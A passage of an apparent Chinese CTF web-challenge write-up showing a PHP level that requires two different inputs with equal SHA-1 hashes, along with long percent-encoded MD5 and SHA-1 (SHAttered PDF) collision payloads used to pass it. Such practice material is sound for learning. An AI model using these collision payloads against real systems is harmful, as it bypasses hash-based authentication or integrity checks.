class="hljs-variable">%97</span><span class="hljs-variable">%b6</span><span class="hljs-variable">%ee</span><span class="hljs-variable">%48</span><span class="hljs-variable">%dd</span><span class="hljs-variable">%0</span>e<span class="hljs-variable">%09</span><span class="hljs-variable">%aa</span><span class="hljs-variable">%e5</span><span class="hljs-variable">%4</span>d<span class="hljs-variable">%6</span>a<span class="hljs-variable">%5</span>d<span class="hljs-variable">%6</span>d<span class="hljs-variable">%75</span><span class="hljs-variable">%77</span><span class="hljs-variable">%72</span><span class="hljs-variable">%cf</span><span class="hljs-variable">%47</span><span class="hljs-variable">%16</span><span class="hljs-variable">%a2</span><span class="hljs-variable">%06</span><span class="hljs-variable">%72</span><span class="hljs-variable">%71</span><span class="hljs-variable">%c9</span><span class="hljs-variable">%a1</span><span class="hljs-variable">%8</span>f<span class="hljs-variable">%00</span><span class="hljs-variable">%f6</span><span class="hljs-variable">%9</span>d<span class="hljs-variable">%ee</span><span class="hljs-variable">%54</span><span class="hljs-variable">%27</span><span class="hljs-variable">%71</span><span class="hljs-variable">%be</span><span class="hljs-variable">%c8</span><span class="hljs-variable">%c3</span><span class="hljs-variable">%8</span>f<span class="hljs-variable">%93</span><span class="hljs-variable">%e3</span><span class="hljs-variable">%52</span><span class="hljs-variable">%73</span><span class="hljs-variable">%73</span><span class="hljs-variable">%53</span><span class="hljs-variable">%a0</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%69</span><span class="hljs-variable">%ef</span><span class="hljs-variable">%c3</span><span class="hljs-variable">%3</span>b<span class="hljs-variable">%ea</span><span class="hljs-variable">%ee</span><span class="hljs-variable">%70</span><span class="hljs-variable">%71</span><span class="hljs-variable">%ae</span><span class="hljs-variable">%2</span>a<span class="hljs-variable">%21</span><span class="hljs-variable">%c8</span><span class="hljs-variable">%44</span><span class="hljs-variable">%d7</span><span class="hljs-variable">%22</span><span class="hljs-variable">%87</span><span class="hljs-variable">%9</span>f<span class="hljs-variable">%be</span><span class="hljs-variable">%79</span><span class="hljs-variable">%6</span>d<span class="hljs-variable">%c4</span><span class="hljs-variable">%61</span><span class="hljs-variable">%a4</span><span class="hljs-variable">%08</span><span class="hljs-variable">%57</span><span class="hljs-variable">%02</span><span class="hljs-variable">%82</span><span class="hljs-variable">%2</span>a<span class="hljs-variable">%ef</span><span class="hljs-variable">%36</span><span class="hljs-variable">%95</span><span class="hljs-variable">%da</span><span class="hljs-variable">%ee</span><span class="hljs-variable">%13</span><span class="hljs-variable">%bc</span><span class="hljs-variable">%fb</span><span class="hljs-variable">%7</span>e<span class="hljs-variable">%a3</span><span class="hljs-variable">%59</span><span class="hljs-variable">%45</span><span class="hljs-variable">%ef</span><span class="hljs-variable">%25</span><span class="hljs-variable">%67</span><span class="hljs-variable">%3</span><span class="hljs-keyword">c</span><span class="hljs-variable">%e0</span><span class="hljs-variable">%27</span><span class="hljs-variable">%69</span><span class="hljs-variable">%2</span>b<span class="hljs-variable">%95</span><span class="hljs-variable">%77</span><span class="hljs-variable">%b8</span><span class="hljs-variable">%cd</span><span class="hljs-variable">%dc</span><span class="hljs-variable">%4</span>f<span class="hljs-variable">%de</span><span class="hljs-variable">%73</span><span class="hljs-variable">%24</span><span class="hljs-variable">%e8</span><span class="hljs-variable">%ab</span><span class="hljs-variable">%66</span><span class="hljs-variable">%74</span><span class="hljs-variable">%d2</span><span class="hljs-variable">%8</span><span class="hljs-keyword">c</span><span class="hljs-variable">%68</span><span class="hljs-variable">%06</span><span class="hljs-variable">%80</span><span class="hljs-variable">%0</span><span class="hljs-keyword">c</span><span class="hljs-variable">%dd</span><span class="hljs-variable">%74</span><span class="hljs-variable">%ae</span><span class="hljs-variable">%31</span><span class="hljs-variable">%05</span><span class="hljs-variable">%d1</span><span class="hljs-variable">%15</span><span class="hljs-variable">%7</span>d<span class="hljs-variable">%c4</span><span class="hljs-variable">%5</span>e<span class="hljs-variable">%bc</span><span class="hljs-variable">%0</span>b<span class="hljs-variable">%0</span>f<span class="hljs-variable">%21</span><span class="hljs-variable">%23</span><span class="hljs-variable">%a4</span><span class="hljs-variable">%96</span><span class="hljs-variable">%7</span><span class="hljs-keyword">c</span><span class="hljs-variable">%17</span><span class="hljs-variable">%12</span><span class="hljs-variable">%d1</span><span class="hljs-variable">%2</span>b<span class="hljs-variable">%b3</span><span class="hljs-variable">%10</span><span class="hljs-variable">%b7</span><span class="hljs-variable">%37</span><span class="hljs-variable">%60</span><span class="hljs-variable">%68</span><span class="hljs-variable">%d7</span><span class="hljs-variable">%cb</span><span class="hljs-variable">%35</span><span class="hljs-variable">%5</span>a<span class="hljs-variable">%54</span><span class="hljs-variable">%97</span><span class="hljs-variable">%08</span><span class="hljs-variable">%0</span>d<span class="hljs-variable">%54</span><span class="hljs-variable">%78</span><span class="hljs-variable">%49</span><span class="hljs-variable">%d0</span><span class="hljs-variable">%93</span><span class="hljs-variable">%c3</span><span class="hljs-variable">%b3</span><span class="hljs-variable">%fd</span><span class="hljs-variable">%1</span>f<span class="hljs-variable">%0</span>b<span class="hljs-variable">%35</span><span class="hljs-variable">%11</span><span class="hljs-variable">%9</span>d<span class="hljs-variable">%96</span><span class="hljs-variable">%1</span>d<span class="hljs-variable">%ba</span><span class="hljs-variable">%64</span><span class="hljs-variable">%e0</span><span class="hljs-variable">%86</span><span class="hljs-variable">%ad</span><span class="hljs-variable">%ef</span><span class="hljs-variable">%52</span><span class="hljs-variable">%98</span><span class="hljs-variable">%2</span>d<span class="hljs-variable">%84</span><span class="hljs-variable">%12</span><span class="hljs-variable">%77</span><span class="hljs-variable">%bb</span><span class="hljs-variable">%ab</span><span class="hljs-variable">%e8</span><span class="hljs-variable">%64</span><span class="hljs-variable">%da</span><span class="hljs-variable">%a3</span><span class="hljs-variable">%65</span><span class="hljs-variable">%55</span><span class="hljs-variable">%5</span>d<span class="hljs-variable">%d5</span><span class="hljs-variable">%76</span><span class="hljs-variable">%55</span><span class="hljs-variable">%57</span><span class="hljs-variable">%46</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%89</span><span class="hljs-variable">%c9</span><span class="hljs-variable">%df</span><span class="hljs-variable">%b2</span><span class="hljs-variable">%3</span><span class="hljs-keyword">c</span><span class="hljs-variable">%85</span><span class="hljs-variable">%97</span><span class="hljs-variable">%1</span>e<span class="hljs-variable">%f6</span><span class="hljs-variable">%38</span><span class="hljs-variable">%66</span><span class="hljs-variable">%c9</span><span class="hljs-variable">%17</span><span class="hljs-variable">%22</span><span class="hljs-variable">%e7</span><span class="hljs-variable">%ea</span><span class="hljs-variable">%c9</span><span class="hljs-variable">%f5</span><span class="hljs-variable">%d2</span><span class="hljs-variable">%e0</span><span class="hljs-variable">%14</span><span class="hljs-variable">%d8</span><span class="hljs-variable">%35</span><span class="hljs-variable">%4</span>f<span class="hljs-variable">%0</span>a<span class="hljs-variable">%5</span><span class="hljs-keyword">c</span><span class="hljs-variable">%34</span><span class="hljs-variable">%d3</span><span class="hljs-variable">%73</span><span class="hljs-variable">%a5</span><span class="hljs-variable">%98</span><span class="hljs-variable">%f7</span><span class="hljs-variable">%66</span><span class="hljs-variable">%72</span><span class="hljs-variable">%aa</span><span class="hljs-variable">%43</span><span class="hljs-variable">%e3</span><span class="hljs-variable">%bd</span><span class="hljs-variable">%a2</span><span class="hljs-variable">%cd</span><span class="hljs-variable">%62</span><span class="hljs-variable">%fd</span><span class="hljs-variable">%69</span><span class="hljs-variable">%1</span>d<span class="hljs-variable">%34</span><span class="hljs-variable">%30</span><span class="hljs-variable">%57</span><span class="hljs-variable">%52</span><span class="hljs-variable">%ab</span><span class="hljs-variable">%41</span><span class="hljs-variable">%b1</span><span class="hljs-variable">%91</span><span class="hljs-variable">%65</span><span class="hljs-variable">%f2</span><span class="hljs-variable">%30</span><span class="hljs-variable">%7</span>f<span class="hljs-variable">%cf</span><span class="hljs-variable">%c6</span><span class="hljs-variable">%a1</span><span class="hljs-variable">%8</span><span class="hljs-keyword">c</span><span class="hljs-variable">%fb</span><span class="hljs-variable">%dc</span><span class="hljs-variable">%c4</span><span class="hljs-variable">%8</span>f<span class="hljs-variable">%61</span><span class="hljs-variable">%a5</span><span class="hljs-variable">%93</span><span class="hljs-variable">%40</span><span class="hljs-variable">%1</span>a<span class="hljs-variable">%13</span><span class="hljs-variable">%d1</span><span class="hljs-variable">%09</span><span class="hljs-variable">%c5</span><span class="hljs-variable">%e0</span><span class="hljs-variable">%f7</span><span class="hljs-variable">%87</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%48</span><span class="hljs-variable">%e7</span><span class="hljs-variable">%d7</span><span class="hljs-variable">%b3</span><span class="hljs-variable">%62</span><span class="hljs-variable">%04</span><span class="hljs-variable">%a7</span><span class="hljs-variable">%c4</span><span class="hljs-variable">%cb</span><span class="hljs-variable">%fd</span><span class="hljs-variable">%f4</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%cf</span><span class="hljs-variable">%3</span>b<span class="hljs-variable">%74</span><span class="hljs-variable">%28</span><span class="hljs-variable">%1</span><span class="hljs-keyword">c</span><span class="hljs-variable">%96</span><span class="hljs-variable">%8</span>e<span class="hljs-variable">%09</span><span class="hljs-variable">%73</span><span class="hljs-variable">%3</span>a<span class="hljs-variable">%9</span>b<span class="hljs-variable">%a6</span><span class="hljs-variable">%2</span>f<span class="hljs-variable">%ed</span><span class="hljs-variable">%b7</span><span class="hljs-variable">%99</span><span class="hljs-variable">%d5</span><span class="hljs-variable">%b9</span><span class="hljs-variable">%05</span><span class="hljs-variable">%39</span><span class="hljs-variable">%95</span><span class="hljs-variable">%ab</span>&amp;array<span class="hljs-number">2</span><span class="hljs-operator">=</span><span class="hljs-variable">%af</span><span class="hljs-variable">%13</span><span class="hljs-variable">%76</span><span class="hljs-variable">%70</span><span class="hljs-variable">%82</span><span class="hljs-variable">%a0</span><span class="hljs-variable">%a6</span><span class="hljs-variable">%58</span><span class="hljs-variable">%cb</span><span class="hljs-variable">%3</span>e<span class="hljs-variable">%23</span><span class="hljs-variable">%38</span><span class="hljs-variable">%c4</span><span class="hljs-variable">%c6</span><span class="hljs-variable">%db</span><span class="hljs-variable">%8</span>b<span class="hljs-variable">%60</span><span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%bb</span><span class="hljs-variable">%90</span><span class="hljs-variable">%68</span><span class="hljs-variable">%a0</span><span class="hljs-variable">%2</span>d<span class="hljs-variable">%e9</span><span class="hljs-variable">%47</span><span class="hljs-variable">%aa</span><span class="hljs-variable">%78</span><span class="hljs-variable">%49</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%0</span>a<span class="hljs-variable">%c0</span><span class="hljs-variable">%c0</span><span class="hljs-variable">%31</span><span class="hljs-variable">%d3</span><span class="hljs-variable">%fb</span><span class="hljs-variable">%cb</span><span class="hljs-variable">%82</span><span class="hljs-variable">%25</span><span class="hljs-variable">%92</span><span class="hljs-variable">%0</span>d<span class="hljs-variable">%cf</span><span class="hljs-variable">%61</span><span class="hljs-variable">%67</span><span class="hljs-variable">%64</span><span class="hljs-variable">%e8</span><span class="hljs-variable">%cd</span><span class="hljs-variable">%7</span>d<span class="hljs-variable">%47</span><span class="hljs-variable">%ba</span><span class="hljs-variable">%0</span>e<span class="hljs-variable">%5</span>d<span class="hljs-variable">%1</span>b<span class="hljs-variable">%9</span><span class="hljs-keyword">c</span><span class="hljs-variable">%1</span><span class="hljs-keyword">c</span><span class="hljs-variable">%5</span><span class="hljs-keyword">c</span><span class="hljs-variable">%cd</span><span class="hljs-variable">%07</span><span class="hljs-variable">%2</span>d<span class="hljs-variable">%f7</span><span class="hljs-variable">%a8</span><span class="hljs-variable">%2</span>d<span class="hljs-variable">%1</span>d<span class="hljs-variable">%bc</span><span class="hljs-variable">%5</span>e<span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%06</span><span class="hljs-variable">%46</span><span class="hljs-variable">%3</span>a<span class="hljs-variable">%0</span>f<span class="hljs-variable">%2</span>d<span class="hljs-variable">%4</span>b<span class="hljs-variable">%e9</span><span class="hljs-variable">%20</span><span class="hljs-variable">%1</span>d<span class="hljs-variable">%29</span><span class="hljs-variable">%66</span><span class="hljs-variable">%a4</span><span class="hljs-variable">%e1</span><span class="hljs-variable">%8</span>b<span class="hljs-variable">%7</span>d<span class="hljs-variable">%0</span><span class="hljs-keyword">c</span><span class="hljs-variable">%f5</span><span class="hljs-variable">%ef</span><span class="hljs-variable">%97</span><span class="hljs-variable">%b6</span><span class="hljs-variable">%ee</span><span class="hljs-variable">%48</span><span class="hljs-variable">%dd</span><span class="hljs-variable">%0</span>e<span class="hljs-variable">%09</span><span class="hljs-variable">%aa</span><span class="hljs-variable">%e5</span><span class="hljs-variable">%4</span>d<span class="hljs-variable">%6</span>a<span class="hljs-variable">%5</span>d<span class="hljs-variable">%6</span>d<span class="hljs-variable">%75</span><span class="hljs-variable">%77</span><span class="hljs-variable">%72</span><span class="hljs-variable">%cf</span><span class="hljs-variable">%47</span><span class="hljs-variable">%16</span><span class="hljs-variable">%a2</span><span class="hljs-variable">%06</span><span class="hljs-variable">%72</span><span class="hljs-variable">%71</span><span class="hljs-variable">%c9</span><span class="hljs-variable">%a1</span><span class="hljs-variable">%8</span>f<span class="hljs-variable">%00</span><span class="hljs-variable">%f6</span><span class="hljs-variable">%9</span>d<span class="hljs-variable">%ee</span><span class="hljs-variable">%54</span><span class="hljs-variable">%27</span><span class="hljs-variable">%71</span><span class="hljs-variable">%be</span><span class="hljs-variable">%c8</span><span class="hljs-variable">%c3</span><span class="hljs-variable">%8</span>f<span class="hljs-variable">%93</span><span class="hljs-variable">%e3</span><span class="hljs-variable">%52</span><span class="hljs-variable">%73</span><span class="hljs-variable">%73</span><span class="hljs-variable">%53</span><span class="hljs-variable">%a0</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%69</span><span class="hljs-variable">%ef</span><span class="hljs-variable">%c3</span><span class="hljs-variable">%3</span>b<span class="hljs-variable">%ea</span><span class="hljs-variable">%ee</span><span class="hljs-variable">%70</span><span class="hljs-variable">%71</span><span class="hljs-variable">%ae</span><span class="hljs-variable">%2</span>a<span class="hljs-variable">%21</span><span class="hljs-variable">%c8</span><span class="hljs-variable">%44</span><span class="hljs-variable">%d7</span><span class="hljs-variable">%22</span><span class="hljs-variable">%87</span><span class="hljs-variable">%9</span>f<span class="hljs-variable">%be</span><span class="hljs-variable">%79</span><span class="hljs-variable">%6</span>d<span class="hljs-variable">%c4</span><span class="hljs-variable">%61</span><span class="hljs-variable">%a4</span><span class="hljs-variable">%08</span><span class="hljs-variable">%57</span><span class="hljs-variable">%02</span><span class="hljs-variable">%82</span><span class="hljs-variable">%2</span>a<span class="hljs-variable">%ef</span><span class="hljs-variable">%36</span><span class="hljs-variable">%95</span><span class="hljs-variable">%da</span><span class="hljs-variable">%ee</span><span class="hljs-variable">%13</span><span class="hljs-variable">%bc</span><span class="hljs-variable">%fb</span><span class="hljs-variable">%7</span>e<span class="hljs-variable">%a3</span><span class="hljs-variable">%59</span><span class="hljs-variable">%45</span><span class="hljs-variable">%ef</span><span class="hljs-variable">%25</span><span class="hljs-variable">%67</span><span class="hljs-variable">%3</span><span class="hljs-keyword">c</span><span class="hljs-variable">%e0</span><span class="hljs-variable">%27</span><span class="hljs-variable">%69</span><span class="hljs-variable">%2</span>b<span class="hljs-variable">%95</span><span class="hljs-variable">%77</span><span class="hljs-variable">%b8</span><span class="hljs-variable">%cd</span><span class="hljs-variable">%dc</span><span class="hljs-variable">%4</span>f<span class="hljs-variable">%de</span><span class="hljs-variable">%73</span><span class="hljs-variable">%24</span><span class="hljs-variable">%e8</span><span class="hljs-variable">%ab</span><span class="hljs-variable">%66</span><span class="hljs-variable">%74</span><span class="hljs-variable">%d2</span><span class="hljs-variable">%8</span><span class="hljs-keyword">c</span><span class="hljs-variable">%68</span><span class="hljs-variable">%06</span><span class="hljs-variable">%80</span><span class="hljs-variable">%0</span><span class="hljs-keyword">c</span><span class="hljs-variable">%dd</span><span class="hljs-variable">%74</span><span class="hljs-variable">%ae</span><span class="hljs-variable">%31</span><span class="hljs-variable">%05</span><span class="hljs-variable">%d1</span><span class="hljs-variable">%15</span><span class="hljs-variable">%7</span>d<span class="hljs-variable">%c4</span><span class="hljs-variable">%5</span>e<span class="hljs-variable">%bc</span><span class="hljs-variable">%0</span>b<span class="hljs-variable">%0</span>f<span class="hljs-variable">%21</span><span class="hljs-variable">%23</span><span class="hljs-variable">%a4</span><span class="hljs-variable">%96</span><span class="hljs-variable">%7</span><span class="hljs-keyword">c</span><span class="hljs-variable">%17</span><span class="hljs-variable">%12</span><span class="hljs-variable">%d1</span><span class="hljs-variable">%2</span>b<span class="hljs-variable">%b3</span><span class="hljs-variable">%10</span><span class="hljs-variable">%b7</span><span class="hljs-variable">%37</span><span class="hljs-variable">%60</span><span class="hljs-variable">%68</span><span class="hljs-variable">%d7</span><span class="hljs-variable">%cb</span><span class="hljs-variable">%35</span><span class="hljs-variable">%5</span>a<span class="hljs-variable">%54</span><span class="hljs-variable">%97</span><span class="hljs-variable">%08</span><span class="hljs-variable">%0</span>d<span class="hljs-variable">%54</span><span class="hljs-variable">%78</span><span class="hljs-variable">%49</span><span class="hljs-variable">%d0</span><span class="hljs-variable">%93</span><span class="hljs-variable">%c3</span><span class="hljs-variable">%b3</span><span class="hljs-variable">%fd</span><span class="hljs-variable">%1</span>f<span class="hljs-variable">%0</span>b<span class="hljs-variable">%35</span><span class="hljs-variable">%11</span><span class="hljs-variable">%9</span>d<span class="hljs-variable">%96</span><span class="hljs-variable">%1</span>d<span class="hljs-variable">%ba</span><span class="hljs-variable">%64</span><span class="hljs-variable">%e0</span><span class="hljs-variable">%86</span><span class="hljs-variable">%ad</span><span class="hljs-variable">%ef</span><span class="hljs-variable">%52</span><span class="hljs-variable">%98</span><span class="hljs-variable">%2</span>d<span class="hljs-variable">%84</span><span class="hljs-variable">%12</span><span class="hljs-variable">%77</span><span class="hljs-variable">%bb</span><span class="hljs-variable">%ab</span><span class="hljs-variable">%e8</span><span class="hljs-variable">%64</span><span class="hljs-variable">%da</span><span class="hljs-variable">%a3</span><span class="hljs-variable">%65</span><span class="hljs-variable">%55</span><span class="hljs-variable">%5</span>d<span class="hljs-variable">%d5</span><span class="hljs-variable">%76</span><span class="hljs-variable">%55</span><span class="hljs-variable">%57</span><span class="hljs-variable">%46</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%89</span><span class="hljs-variable">%c9</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%b2</span><span class="hljs-variable">%3</span><span class="hljs-keyword">c</span><span class="hljs-variable">%85</span><span class="hljs-variable">%97</span><span class="hljs-variable">%1</span>e<span class="hljs-variable">%f6</span><span class="hljs-variable">%38</span><span class="hljs-variable">%66</span><span class="hljs-variable">%c9</span><span class="hljs-variable">%17</span><span class="hljs-variable">%22</span><span class="hljs-variable">%e7</span><span class="hljs-variable">%ea</span><span class="hljs-variable">%c9</span><span class="hljs-variable">%f5</span><span class="hljs-variable">%d2</span><span class="hljs-variable">%e0</span><span class="hljs-variable">%14</span><span class="hljs-variable">%d8</span><span class="hljs-variable">%35</span><span class="hljs-variable">%4</span>f<span class="hljs-variable">%0</span>a<span class="hljs-variable">%5</span><span class="hljs-keyword">c</span><span class="hljs-variable">%34</span><span class="hljs-variable">%d3</span><span class="hljs-variable">%f3</span><span class="hljs-variable">%a5</span><span class="hljs-variable">%98</span><span class="hljs-variable">%f7</span><span class="hljs-variable">%66</span><span class="hljs-variable">%72</span><span class="hljs-variable">%aa</span><span class="hljs-variable">%43</span><span class="hljs-variable">%e3</span><span class="hljs-variable">%bd</span><span class="hljs-variable">%a2</span><span class="hljs-variable">%cd</span><span class="hljs-variable">%62</span><span class="hljs-variable">%fd</span><span class="hljs-variable">%e9</span><span class="hljs-variable">%1</span>d<span class="hljs-variable">%34</span><span class="hljs-variable">%30</span><span class="hljs-variable">%57</span><span class="hljs-variable">%52</span><span class="hljs-variable">%ab</span><span class="hljs-variable">%41</span><span class="hljs-variable">%b1</span><span class="hljs-variable">%91</span><span class="hljs-variable">%65</span><span class="hljs-variable">%f2</span><span class="hljs-variable">%30</span><span class="hljs-variable">%7</span>f<span class="hljs-variable">%cf</span><span class="hljs-variable">%c6</span><span class="hljs-variable">%a1</span><span class="hljs-variable">%8</span><span class="hljs-keyword">c</span><span class="hljs-variable">%fb</span><span class="hljs-variable">%dc</span><span class="hljs-variable">%c4</span><span class="hljs-variable">%8</span>f<span class="hljs-variable">%61</span><span class="hljs-variable">%a5</span><span class="hljs-variable">%13</span><span class="hljs-variable">%40</span><span class="hljs-variable">%1</span>a<span class="hljs-variable">%13</span><span class="hljs-variable">%d1</span><span class="hljs-variable">%09</span><span class="hljs-variable">%c5</span><span class="hljs-variable">%e0</span><span class="hljs-variable">%f7</span><span class="hljs-variable">%87</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%48</span><span class="hljs-variable">%e7</span><span class="hljs-variable">%d7</span><span class="hljs-variable">%b3</span><span class="hljs-variable">%62</span><span class="hljs-variable">%04</span><span class="hljs-variable">%a7</span><span class="hljs-variable">%c4</span><span class="hljs-variable">%cb</span><span class="hljs-variable">%fd</span><span class="hljs-variable">%f4</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%cf</span><span class="hljs-variable">%3</span>b<span class="hljs-variable">%74</span><span class="hljs-variable">%a8</span><span class="hljs-variable">%1</span>b<span class="hljs-variable">%96</span><span class="hljs-variable">%8</span>e<span class="hljs-variable">%09</span><span class="hljs-variable">%73</span><span class="hljs-variable">%3</span>a<span class="hljs-variable">%9</span>b<span class="hljs-variable">%a6</span><span class="hljs-variable">%2</span>f<span class="hljs-variable">%ed</span><span class="hljs-variable">%b7</span><span class="hljs-variable">%99</span><span class="hljs-variable">%d5</span><span class="hljs-variable">%39</span><span class="hljs-variable">%05</span><span class="hljs-variable">%39</span><span class="hljs-variable">%95</span><span class="hljs-variable">%ab</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/total/image-20240123152944845.png" srcset="/img/loading.gif" lazyload alt="image-20240123152944845"></p>
+<p>出现了第三关</p>
+<p>0x03</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//here is level 3</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;str.php&quot;</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;array1&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;array2&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$a1</span> = (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;array1&#x27;</span>];<br>    <span class="hljs-variable">$a2</span> = (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;array2&#x27;</span>];<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$a1</span> == <span class="hljs-variable">$a2</span>)&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;????&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$a1</span>) === <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$a2</span>))&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$level4</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;level 3 failed ...&quot;</span>);<br>    &#125;<br><br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>绕过sha1就可以了</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">array<span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-variable">%25</span>PDF<span class="hljs-number">-1.3</span><span class="hljs-variable">%0</span>A<span class="hljs-variable">%25</span><span class="hljs-variable">%E2</span><span class="hljs-variable">%E3</span><span class="hljs-variable">%CF</span><span class="hljs-variable">%D3</span><span class="hljs-variable">%0</span>A<span class="hljs-variable">%0</span>A<span class="hljs-variable">%0</span>A<span class="hljs-number">1</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>obj<span class="hljs-variable">%0</span>A<span class="hljs-variable">%3</span>C<span class="hljs-variable">%3</span>C/Width<span class="hljs-variable">%202</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>R/Height<span class="hljs-variable">%203</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>R/Type<span class="hljs-variable">%204</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>R/Subtype<span class="hljs-variable">%205</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>R/Filter<span class="hljs-variable">%206</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>R/ColorSpace<span class="hljs-variable">%207</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>R/Length<span class="hljs-variable">%208</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>R/BitsPerComponent<span class="hljs-variable">%208</span><span class="hljs-variable">%3</span>E<span class="hljs-variable">%3</span>E<span class="hljs-variable">%0</span>Astream<span class="hljs-variable">%0</span>A<span class="hljs-variable">%FF</span><span class="hljs-variable">%D8</span><span class="hljs-variable">%FF</span><span class="hljs-variable">%FE</span><span class="hljs-variable">%00</span><span class="hljs-variable">%24</span>SHA<span class="hljs-number">-1</span><span class="hljs-variable">%20</span>is<span class="hljs-variable">%20</span>dead<span class="hljs-variable">%21</span><span class="hljs-variable">%21</span><span class="hljs-variable">%21</span><span class="hljs-variable">%21</span><span class="hljs-variable">%21</span><span class="hljs-variable">%85</span>/<span class="hljs-variable">%EC</span><span class="hljs-variable">%09</span><span class="hljs-variable">%239</span>u<span class="hljs-variable">%9</span>C<span class="hljs-number">9</span><span class="hljs-variable">%B1</span><span class="hljs-variable">%A1</span><span class="hljs-variable">%C6</span><span class="hljs-variable">%3</span>CL<span class="hljs-variable">%97</span><span class="hljs-variable">%E1</span><span class="hljs-variable">%FF</span><span class="hljs-variable">%FE</span><span class="hljs-variable">%01</span><span class="hljs-variable">%7</span>FF<span class="hljs-variable">%DC</span><span class="hljs-variable">%93</span><span class="hljs-variable">%A6</span><span class="hljs-variable">%B6</span><span class="hljs-variable">%7</span>E<span class="hljs-variable">%01</span><span class="hljs-variable">%3</span>B<span class="hljs-variable">%02</span><span class="hljs-variable">%9</span>A<span class="hljs-variable">%AA</span><span class="hljs-variable">%1</span>D<span class="hljs-variable">%B2V</span><span class="hljs-variable">%0</span>BE<span class="hljs-variable">%CAg</span><span class="hljs-variable">%D6</span><span class="hljs-variable">%88</span><span class="hljs-variable">%C7</span><span class="hljs-variable">%F8K</span><span class="hljs-variable">%8</span>CLy<span class="hljs-variable">%1</span>F<span class="hljs-variable">%E0</span><span class="hljs-variable">%2</span>B<span class="hljs-variable">%3</span>D<span class="hljs-variable">%F6</span><span class="hljs-variable">%14</span><span class="hljs-variable">%F8m</span><span class="hljs-variable">%B1i</span><span class="hljs-variable">%09</span><span class="hljs-variable">%01</span><span class="hljs-variable">%C5kE</span><span class="hljs-variable">%C1S</span><span class="hljs-variable">%0</span>A<span class="hljs-variable">%FE</span><span class="hljs-variable">%DF</span><span class="hljs-variable">%B7</span><span class="hljs-variable">%608</span><span class="hljs-variable">%E9rr</span>/<span class="hljs-variable">%E7</span><span class="hljs-variable">%ADr</span><span class="hljs-variable">%8</span>F<span class="hljs-variable">%0</span>EI<span class="hljs-variable">%04</span><span class="hljs-variable">%E0F</span><span class="hljs-variable">%C20W</span><span class="hljs-variable">%0</span>F<span class="hljs-variable">%E9</span><span class="hljs-variable">%D4</span><span class="hljs-variable">%13</span><span class="hljs-variable">%98</span><span class="hljs-variable">%AB</span><span class="hljs-variable">%E1.</span><span class="hljs-variable">%F5</span><span class="hljs-variable">%BC</span><span class="hljs-variable">%94</span><span class="hljs-variable">%2</span>B<span class="hljs-variable">%E35B</span><span class="hljs-variable">%A4</span><span class="hljs-variable">%80</span>-<span class="hljs-variable">%98</span><span class="hljs-variable">%B5</span><span class="hljs-variable">%D7</span><span class="hljs-variable">%0</span>F<span class="hljs-variable">%2</span>A<span class="hljs-number">3</span>.<span class="hljs-variable">%C3</span><span class="hljs-variable">%7</span>F<span class="hljs-variable">%AC5</span><span class="hljs-variable">%14</span><span class="hljs-variable">%E7M</span><span class="hljs-variable">%DC</span><span 